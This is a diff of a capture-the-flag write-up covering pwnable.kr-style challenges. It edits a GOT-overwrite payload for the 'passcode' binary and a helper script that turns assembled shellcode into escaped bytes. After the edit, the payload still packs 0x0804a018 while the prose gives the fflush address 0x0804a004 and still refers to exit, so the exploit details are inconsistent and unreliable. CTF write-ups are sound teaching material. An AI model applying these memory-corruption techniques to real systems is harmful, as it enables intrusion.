@@ -27,7 +27,6 @@ strings -n 10 flag | grep ":)$"
 
 
 
-
 #play
  - We see ASLR is enabled `cat /proc/sys/kernel/randomize_va_space`.
    [More](https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/)
@@ -55,8 +54,8 @@ import struct; print "\x41"*96 + struct.pack("<I", 0x0804a018)
 ```
 
 But what should we point to? Here's where the GOT comes in. We use the
-following command to figure out the dynamic relocations of the exit function:
-`objdump -R passcode`. In this case, it is at `0x0804a018`. We want to write a
+following command to figure out the dynamic relocations of the fflush function:
+`objdump -R passcode`. In this case, it is at `0x0804a004`. We want to write a
 new value to this address (done as part of the vulnerable scanf) to cause the
 call to exit to jump to a different bit of code. A bit of disassembly
 examination tells use that 0x80485e3 would be a good location as that is the
@@ -351,8 +350,7 @@ And here is a helper script to run on the server:
 
 as -o shell.o shell.asm && ld -o shell shell.o
 
-MUFN=`for i in $(objdump -d shell -M intel |grep "^ " |cut -f2); do echo -n
-'\x'$i; done;echo`
+  MUFN=`for i in $(objdump -d shell -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo`
 
 dir=`pwd`
 cd
